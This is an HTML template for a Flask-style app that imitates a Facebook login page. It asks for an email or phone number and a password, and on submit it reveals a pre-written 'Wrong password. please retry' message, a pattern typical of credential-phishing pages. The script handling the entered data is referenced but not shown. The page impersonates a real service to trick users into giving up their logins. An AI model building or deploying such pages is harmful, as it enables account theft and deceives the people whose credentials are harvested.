<!DOCTYPE html>
<html>
<head>
    <title>Facebook Login</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/static/stylesheet.css">
</head>
<body>
<img src="/static/img.png" class="icon">
<div class="container">
    <p class="wrong" id="wrong">Wrong password. please retry</p>
    <h1>Log in with Facebook</h1>
    <form>
        <label for="email">Email or Phone:</label>
        <input type="text" id="email" name="email" placeholder="Enter email or phone number">

        <label for="password">Password:</label>
        <input type="password" id="password" name="password" placeholder="Enter password">

        <input onclick="showParagraph()" type="submit" value="Log In" >
    </form>
    <div class="links">
        <a href="#">Forgot Password?</a>
        <a href="#">Sign up for Facebook</a>
    </div>
</div>
<script type = "text/javascript"
src="{{url_for('static',filename='index.js')}}"></script>
</body>
</html>
